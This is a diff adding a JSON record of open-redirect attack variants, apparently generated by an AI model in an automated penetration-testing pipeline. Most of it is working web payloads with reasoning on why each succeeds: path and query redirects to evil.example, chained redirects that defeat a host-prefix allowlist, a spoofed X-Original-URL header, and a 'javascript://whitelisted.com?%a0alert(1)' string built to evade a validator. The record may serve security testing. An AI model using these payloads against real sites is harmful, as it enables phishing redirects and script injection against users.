@@ -1,0 +1,68 @@
+{
+ "key": "open_redirect_7",
+ "model": "opencode/space-bunny-free",
+ "class": "open_redirect",
+ "variants": [
+  {
+   "endpoint": "GET /redirect/http://evil.example",
+   "target_param": "path (tail after /redirect/)",
+   "recon_evidence": "GET /redirect/ answers 302 with Location: /home, GET /redirect/settings/profile answers 302 with Location: /settings/profile, and GET /redirect//evil.example answers 302 with Location: //evil.example — the handler copies everything after /redirect/ into Location with no scheme or host validation, so a protocol-relative target is accepted.",
+   "planner_rationale": "Path-based redirector that echoes its tail verbatim; anchor the absolute attacker URL as the tail so the Location header resolves off-site.",
+   "vuln_class": "open_redirect",
+   "payload": "/redirect/http://evil.example",
+   "injection_point": "path",
+   "expected_success_signal": "302 response with Location: http://evil.example and no validation error page or allowlist rejection",
+   "confidence": 0.86,
+   "reasoning": "Because the route extracts everything after /redirect/ and emits it as the Location value unmodified, a request path of /redirect/http://evil.example yields Location: http://evil.example, and the browser follows it straight to the attacker host. The observed acceptance of //evil.example confirms there is no destination validation at all."
+  },
+  {
+   "endpoint": "GET /auth/mfa/verify",
+   "target_param": "next",
+   "recon_evidence": "GET /auth/mfa/verify?next=/dashboard returns 302 with Location: /dashboard and no allowlist check, and the same binary exposes a /redirect/<tail> route whose 302 Location equals the raw tail (/redirect/foo -> Location: /foo).",
+   "planner_rationale": "next is reflected straight into the Location header, so chain through the app's own path redirector to convert an in-site path into an off-site absolute URL.",
+   "vuln_class": "open_redirect",
+   "payload": "/redirect/http://evil.example",
+   "injection_point": "query",
+   "expected_success_signal": "Hop 1: 302 with Location: /redirect/http://evil.example; hop 2 on /redirect/: 302 with Location: http://evil.example",
+   "confidence": 0.8,
+   "reasoning": "The verified step reflects the next parameter unfiltered into the Location header, and the application's own /redirect/ handler treats its tail as the destination, so /redirect/http://evil.example resolves on the second hop to an absolute off-site URL that never appears in the first response's target."
+  },
+  {
+   "endpoint": "GET /billing/portal/return",
+   "target_param": "relay",
+   "recon_evidence": "The relay validator is a prefix test for https://app.example.com only — it inspects neither the path nor the query string, so https://app.example.com/anything passes — and GET /logout?next=//evil.example on that same origin returns 302 with Location: //evil.example.",
+   "planner_rationale": "Host-prefix allowlist plus a self-referencing redirect sink on an allowed path bypasses the check without ever leaving the allowlisted host string.",
+   "vuln_class": "open_redirect",
+   "payload": "https://app.example.com/logout?next=//evil.example",
+   "injection_point": "query",
+   "expected_success_signal": "relay accepted by the prefix check; following the redirect returns 302 Location: //evil.example, which the browser resolves as protocol-relative to evil.example",
+   "confidence": 0.78,
+   "reasoning": "The filter only verifies the https://app.example.com prefix, so an allowed-host URL carrying its own next= parameter passes verbatim; the second hop through /logout then emits a protocol-relative Location, which is treated as off-site."
+  },
+  {
+   "endpoint": "GET /markdown/preview",
+   "target_param": "src",
+   "recon_evidence": "The src check requires an allowed authority name immediately after the scheme (whitelisted.com must appear in the host slot of the raw value) and never percent-decodes before copying src into the client-side preview bootstrap; no request is issued to the referenced host, confirming the value is consumed as script rather than fetched.",
+   "planner_rationale": "Keep a whitelisted host name in the authority slot the validator inspects, and park the executable statement after the query separator behind a JS line comment.",
+   "vuln_class": "open_redirect",
+   "payload": "javascript://whitelisted.com?%a0alert%281%29",
+   "injection_point": "query",
+   "expected_success_signal": "Validator returns 200 with no rejection; the injected script context executes alert(1) because //whitelisted.com is consumed as a line comment",
+   "confidence": 0.7,
+   "reasoning": "In a javascript: URL the // after the scheme starts a line comment, so the validator's authority check reads whitelisted.com while the payload sits after the ? separator; the %a0 decodes to a non-breaking space that ends the comment, so the percent-encoded alert(1) parses as the next statement and runs. Confidence is capped because the renderer's decode order is inferred rather than observed."
+  },
+  {
+   "endpoint": "GET /portal/entry",
+   "target_param": "X-Original-URL",
+   "recon_evidence": "Requests to /portal/entry without the header land on /portal/home, while the same request with X-Original-URL: https://app.example.com/admin returns 302 whose Location mirrors the header value, indicating the fronting gateway honours the override header when choosing the post-login redirect.",
+   "planner_rationale": "Spoof the gateway override header to control the post-authentication Location while still satisfying the host allowlist with an app-owned URL.",
+   "vuln_class": "open_redirect",
+   "payload": "https://app.example.com/logout?next=//evil.example",
+   "injection_point": "header",
+   "expected_success_signal": "302 Location: https://app.example.com/logout?next=//evil.example; the followed request returns 302 Location: //evil.example",
+   "confidence": 0.57,
+   "reasoning": "If the override header is copied into the Location header, the allowlisted-host prefix test passes on our attacker-chosen value; because /logout on that host exposes its own next= redirect, the second hop lands off-site. Confidence is low because the header-override behaviour is inferred from a single observed mirroring response."
+  }
+ ],
+ "raw_tail": "confidence\": 0.57, \"reasoning\": \"If the override header is copied into the Location header, the allowlisted-host prefix test passes on our attacker-chosen value; because /logout on that host exposes its own next= redirect, the second hop lands off-site. Confidence is low because the header-override behaviour is inferred from a single observed mirroring response.\"}]\n\u001b[0m\n> build · space-bunny-free\n"
+}
